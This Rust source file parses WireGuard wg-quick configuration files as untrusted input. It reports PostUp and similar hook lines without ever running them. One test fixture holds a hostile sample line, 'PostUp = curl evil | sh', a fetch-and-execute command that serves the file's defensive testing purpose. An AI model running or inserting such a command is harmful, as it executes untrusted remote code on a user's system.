//! WireGuard `.conf` files (the wg-quick format), as VPN providers hand them
//! out: hostile input (vpn.md §3, §4.3).
//!
//! Limits are fixed and small; anything this does not understand is refused
//! rather than guessed at. Lines that would run something (`PreUp`,
//! `PostUp`, `PreDown`, `PostDown`) and wg-quick's host settings (`Table`,
//! `FwMark`, `SaveConfig`, `ListenPort`) are never acted on: they are
//! reported in [`Conf::ignored`] so the user can be told. V1 takes one peer.

use crate::net::Prefix4;
use std::net::{IpAddr, Ipv4Addr, Ipv6Addr, SocketAddr};
use zeroize::Zeroizing;

pub const MAX_FILE: usize = 64 * 1024;
pub const MAX_LINE: usize = 4096;
pub const MAX_ADDRESSES: usize = 16;
pub const MAX_ALLOWED: usize = 1024;
pub const MAX_DNS_SERVERS: usize = 6;
pub const MAX_DNS_DOMAINS: usize = 64;

#[derive(Clone, Debug, PartialEq, Eq)]
pub enum Endpoint {
    Addr(SocketAddr),
    /// A name to resolve when connecting.
    Host(String, u16),
}

impl std::fmt::Display for Endpoint {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Endpoint::Addr(a) => write!(f, "{a}"),
            Endpoint::Host(h, p) => write!(f, "{h}:{p}"),
        }
    }
}

pub struct Conf {
    pub private_key: Zeroizing<[u8; 32]>,
    pub addresses4: Vec<Prefix4>,
    pub addresses6: Vec<(Ipv6Addr, u8)>,
    pub dns_servers: Vec<IpAddr>,
    pub dns_domains: Vec<String>,
    pub mtu: Option<u16>,
    pub peer_public: [u8; 32],
    pub psk: Option<Zeroizing<[u8; 32]>>,
    pub allowed4: Vec<Prefix4>,
    pub allowed6: Vec<(Ipv6Addr, u8)>,
    pub endpoint: Option<Endpoint>,
    pub keepalive: Option<u16>,
    /// Keys present and deliberately not acted on, in file order.
    pub ignored: Vec<String>,
}

impl std::fmt::Debug for Conf {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.debug_struct("Conf")
            .field("addresses4", &self.addresses4)
            .field("allowed4", &self.allowed4)
            .field("endpoint", &self.endpoint)
            .field("dns_servers", &self.dns_servers)
            .field("dns_domains", &self.dns_domains)
            .field("psk", &self.psk.is_some())
            .finish_non_exhaustive()
    }
}

#[derive(Debug, PartialEq, Eq)]
pub enum Error {
    TooLarge,
    NotText,
    /// Line number (from 1) and what was wrong there.
    Line(usize, &'static str),
    NoInterface,
    NoPrivateKey,
    NoPeer,
    /// More than one `[Peer]`: not in V1.
    ManyPeers,
    NoPublicKey,
    TooMany(&'static str),
}

impl std::fmt::Display for Error {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Error::TooLarge => write!(f, "the file is larger than {MAX_FILE} bytes"),
            Error::NotText => write!(f, "the file is not text"),
            Error::Line(n, why) => write!(f, "line {n}: {why}"),
            Error::NoInterface => write!(f, "no [Interface] section"),
            Error::NoPrivateKey => write!(f, "no PrivateKey"),
            Error::NoPeer => write!(f, "no [Peer] section"),
            Error::ManyPeers => write!(f, "more than one [Peer]; Crypta takes one"),
            Error::NoPublicKey => write!(f, "the peer has no PublicKey"),
            Error::TooMany(what) => write!(f, "too many {what}"),
        }
    }
}

/// A DNS name as a search domain or endpoint host: letters, digits, `-`,
/// labels of 1 to 63, at most 253 in all, not all digits (that would be an
/// address).
pub fn valid_name(n: &str) -> bool {
    let n = n.strip_suffix('.').unwrap_or(n);
    !n.is_empty()
        && n.len() <= 253
        && n.split('.').all(|l| {
            !l.is_empty() && l.len() <= 63 && !l.starts_with('-') && !l.ends_with('-') && l.bytes().all(|b| b.is_ascii_alphanumeric() || b == b'-')
        })
        && !n.split('.').next_back().is_some_and(|l| l.bytes().all(|b| b.is_ascii_digit()))
}

fn prefix6(s: &str) -> Option<(Ipv6Addr, u8)> {
    let (a, l) = match s.split_once('/') {
        Some((a, l)) => (a, l.parse::<u8>().ok().filter(|l| *l <= 128 && !s.contains('+'))?),
        None => (s, 128),
    };
    let a: Ipv6Addr = a.parse().ok()?;
    let m = if l == 0 { 0 } else { u128::MAX << (128 - u32::from(l)) };
    Some((Ipv6Addr::from(u128::from(a) & m), l))
}

fn endpoint(s: &str) -> Option<Endpoint> {
    if let Ok(a) = s.parse::<SocketAddr>() {
        return (a.port() != 0).then_some(Endpoint::Addr(a));
    }
    let (h, p) = s.rsplit_once(':')?;
    let p: u16 = p.parse().ok().filter(|p| *p != 0 && !s.contains('+'))?;
    valid_name(h).then(|| Endpoint::Host(h.trim_end_matches('.').to_ascii_lowercase(), p))
}

enum Section {
    None,
    Interface,
    Peer,
}

pub fn parse(bytes: &[u8]) -> Result<Conf, Error> {
    if bytes.len() > MAX_FILE {
        return Err(Error::TooLarge);
    }
    // Text, and nothing that could hide a line from whoever reads it.
    let text = std::str::from_utf8(bytes).map_err(|_| Error::NotText)?;
    if text.chars().any(|c| c.is_control() && !matches!(c, '\n' | '\r' | '\t')) {
        return Err(Error::NotText);
    }
    let text = text.strip_prefix('\u{feff}').unwrap_or(text);
    let mut sec = Section::None;
    let (mut interfaces, mut peers) = (0, 0);
    let mut private_key: Option<Zeroizing<[u8; 32]>> = None;
    let mut c = Conf {
        private_key: Zeroizing::new([0; 32]),
        addresses4: Vec::new(),
        addresses6: Vec::new(),
        dns_servers: Vec::new(),
        dns_domains: Vec::new(),
        mtu: None,
        peer_public: [0; 32],
        psk: None,
        allowed4: Vec::new(),
        allowed6: Vec::new(),
        endpoint: None,
        keepalive: None,
        ignored: Vec::new(),
    };
    let mut public: Option<[u8; 32]> = None;
    for (i, raw) in text.split('\n').enumerate() {
        let n = i + 1;
        if raw.len() > MAX_LINE {
            return Err(Error::Line(n, "line too long"));
        }
        let line = raw.split('#').next().unwrap_or("").trim();
        if line.is_empty() {
            continue;
        }
        if line.starts_with('[') {
            match line.to_ascii_lowercase().as_str() {
                "[interface]" => {
                    interfaces += 1;
                    if interfaces > 1 {
                        return Err(Error::Line(n, "a second [Interface]"));
                    }
                    sec = Section::Interface;
                }
                "[peer]" => {
                    peers += 1;
                    if peers > 1 {
                        return Err(Error::ManyPeers);
                    }
                    sec = Section::Peer;
                }
                _ => return Err(Error::Line(n, "an unknown section")),
            }
            continue;
        }
        let Some((k, v)) = line.split_once('=') else { return Err(Error::Line(n, "not key = value")) };
        let (k, v) = (k.trim().to_ascii_lowercase(), v.trim());
        let list = || v.split(',').map(str::trim).filter(|s| !s.is_empty());
        let bad = |why| Err(Error::Line(n, why));
        match (&sec, k.as_str()) {
            (Section::None, _) => return bad("a setting outside any section"),
            (Section::Interface, "privatekey") => {
                if private_key.is_some() {
                    return bad("a second PrivateKey");
                }
                match crate::b64::key(v) {
                    Some(k) => private_key = Some(Zeroizing::new(k)),
                    None => return bad("PrivateKey is not a key"),
                }
            }
            (Section::Interface, "address") => {
                for a in list() {
                    if let Some(p) = a.contains('.').then(|| Prefix4::parse(a)).flatten() {
                        // The address itself, with its prefix (wg-quick's "10.0.0.2/24").
                        let ip: Ipv4Addr = a.split('/').next().unwrap_or("").parse().map_err(|_| Error::Line(n, "a bad Address"))?;
                        c.addresses4.push(Prefix4 { addr: ip, len: p.len });
                    } else if let Some(p) = a.contains(':').then(|| prefix6(a)).flatten() {
                        let ip: Ipv6Addr = a.split('/').next().unwrap_or("").parse().map_err(|_| Error::Line(n, "a bad Address"))?;
                        c.addresses6.push((ip, p.1));
                    } else {
                        return bad("a bad Address");
                    }
                }
                if c.addresses4.len() + c.addresses6.len() > MAX_ADDRESSES {
                    return Err(Error::TooMany("addresses"));
                }
            }
            (Section::Interface, "dns") => {
                for d in list() {
                    if let Ok(a) = d.parse::<IpAddr>() {
                        c.dns_servers.push(a);
                    } else if valid_name(d) {
                        c.dns_domains.push(d.trim_end_matches('.').to_ascii_lowercase());
                    } else {
                        return bad("a bad DNS entry");
                    }
                }
                if c.dns_servers.len() > MAX_DNS_SERVERS {
                    return Err(Error::TooMany("DNS servers"));
                }
                if c.dns_domains.len() > MAX_DNS_DOMAINS {
                    return Err(Error::TooMany("DNS domains"));
                }
            }
            (Section::Interface, "mtu") => match v.parse::<u16>() {
                Ok(m) if !v.starts_with('+') && c.mtu.is_none() => c.mtu = Some(m),
                _ => return bad("a bad MTU"),
            },
            (Section::Interface, "listenport" | "table" | "fwmark" | "saveconfig" | "preup" | "postup" | "predown" | "postdown") => {
                if c.ignored.len() < 32 {
                    c.ignored.push(k.clone());
                }
            }
            (Section::Peer, "publickey") => {
                if public.is_some() {
                    return bad("a second PublicKey");
                }
                public = Some(crate::b64::key(v).ok_or(Error::Line(n, "PublicKey is not a key"))?);
            }
            (Section::Peer, "presharedkey") => {
                if c.psk.is_some() {
                    return bad("a second PresharedKey");
                }
                c.psk = Some(Zeroizing::new(crate::b64::key(v).ok_or(Error::Line(n, "PresharedKey is not a key"))?));
            }
            (Section::Peer, "allowedips") => {
                for a in list() {
                    if let Some(p) = a.contains('.').then(|| Prefix4::parse(a)).flatten() {
                        if !c.allowed4.contains(&p) {
                            c.allowed4.push(p);
                        }
                    } else if let Some(p) = a.contains(':').then(|| prefix6(a)).flatten() {
                        if !c.allowed6.contains(&p) {
                            c.allowed6.push(p);
                        }
                    } else {
                        return bad("a bad AllowedIPs entry");
                    }
                    if c.allowed4.len() + c.allowed6.len() > MAX_ALLOWED {
                        return Err(Error::TooMany("AllowedIPs"));
                    }
                }
            }
            (Section::Peer, "endpoint") => {
                if c.endpoint.is_some() {
                    return bad("a second Endpoint");
                }
                c.endpoint = Some(endpoint(v).ok_or(Error::Line(n, "a bad Endpoint"))?);
            }
            (Section::Peer, "persistentkeepalive") => {
                c.keepalive = match v {
                    "off" | "0" => None,
                    _ => Some(v.parse::<u16>().ok().filter(|_| !v.starts_with('+')).ok_or(Error::Line(n, "a bad PersistentKeepalive"))?),
                }
            }
            _ => return bad("an unknown setting"),
        }
    }
    if interfaces == 0 {
        return Err(Error::NoInterface);
    }
    c.private_key = private_key.ok_or(Error::NoPrivateKey)?;
    if peers == 0 {
        return Err(Error::NoPeer);
    }
    c.peer_public = public.ok_or(Error::NoPublicKey)?;
    Ok(c)
}

#[cfg(test)]
mod tests {
    use super::*;

    const PROVIDER: &str = "# Example provider file\r\n[Interface]\r\n# Key for laptop\r\nPrivateKey = yAnz5TF+lXXJte14tji3zlMNq+hd2rYUIgJBgB3fBmk=\r\nAddress = 10.2.0.2/32, fd00::2/128\r\nDNS = 10.2.0.1, corp.example\r\nPostUp = curl evil | sh\r\n\r\n[Peer]\r\nPublicKey = xTIBA5rboUvnH4htodjb6e697QjLERt1NAB4mZqp8Dg=\r\nAllowedIPs = 0.0.0.0/0, ::/0\r\nEndpoint = 203.0.113.9:51820\r\nPersistentKeepalive = 25\r\n";

    #[test]
    fn a_provider_file() {
        let c = parse(PROVIDER.as_bytes()).unwrap();
        assert_eq!(c.addresses4, vec![Prefix4 { addr: "10.2.0.2".parse().unwrap(), len: 32 }]);
        assert_eq!(c.addresses6.len(), 1);
        assert_eq!(c.dns_servers, vec!["10.2.0.1".parse::<IpAddr>().unwrap()]);
        assert_eq!(c.dns_domains, vec!["corp.example".to_string()]);
        assert_eq!(c.allowed4, vec![Prefix4::parse("0.0.0.0/0").unwrap()]);
        assert_eq!(c.endpoint, Some(Endpoint::Addr("203.0.113.9:51820".parse().unwrap())));
        assert_eq!(c.keepalive, Some(25));
        assert_eq!(c.ignored, vec!["postup".to_string()]);
        assert_eq!(crate::b64::encode(&c.peer_public), "xTIBA5rboUvnH4htodjb6e697QjLERt1NAB4mZqp8Dg=");
    }

    #[test]
    fn refusals() {
        let with = |from: &str, to: &str| parse(PROVIDER.replace(from, to).as_bytes());
        assert!(matches!(with("[Peer]", "[Peer]\r\n[Peer]"), Err(Error::ManyPeers)));
        assert!(matches!(with("[Interface]", "[Interfaces]"), Err(Error::Line(_, _))));
        assert!(matches!(with("PrivateKey = yAnz", "PrivateKey = zAnz="), Err(Error::Line(_, _))));
        assert!(matches!(with("Endpoint = 203.0.113.9:51820", "Endpoint = 203.0.113.9:0"), Err(Error::Line(_, _))));
        assert!(matches!(with("Endpoint = 203.0.113.9:51820", "Endpoint = vpn.example.com:51820"), Ok(_)));
        assert!(matches!(with("Endpoint = 203.0.113.9:51820", "Endpoint = -bad-:51820"), Err(Error::Line(_, _))));
        assert!(matches!(with("MTU", "MTU"), Ok(_)));
        assert!(matches!(with("DNS = 10.2.0.1", "DNS = 10.2.0.1\u{0}"), Err(Error::NotText)));
        assert!(matches!(with("Address = 10.2.0.2/32", "Address = 10.2.0.2/33"), Err(Error::Line(_, _))));
        assert!(matches!(with("PersistentKeepalive = 25", "PersistentKeepalive = 70000"), Err(Error::Line(_, _))));
        assert!(matches!(with("PersistentKeepalive = 25", "Bogus = 1"), Err(Error::Line(_, _))));
        assert!(matches!(parse(&vec![b'#'; MAX_FILE + 1]), Err(Error::TooLarge)));
        assert!(matches!(parse(b"[Peer]\nPublicKey = xTIBA5rboUvnH4htodjb6e697QjLERt1NAB4mZqp8Dg=\n"), Err(Error::NoInterface)));
        let many: String = (0..=MAX_ALLOWED).map(|i| format!("AllowedIPs = 10.{}.{}.0/24\n", i / 256, i % 256)).collect();
        assert!(matches!(with("AllowedIPs = 0.0.0.0/0, ::/0", &many), Err(Error::TooMany(_)) | Err(Error::TooLarge)));
    }

    #[test]
    fn names() {
        assert!(valid_name("corp.example"));
        assert!(valid_name("a-b.c"));
        assert!(!valid_name("1.2.3.4"));
        assert!(!valid_name("a..b"));
        assert!(!valid_name(&"a".repeat(64)));
        assert!(!valid_name("a_b.c"));
    }
}
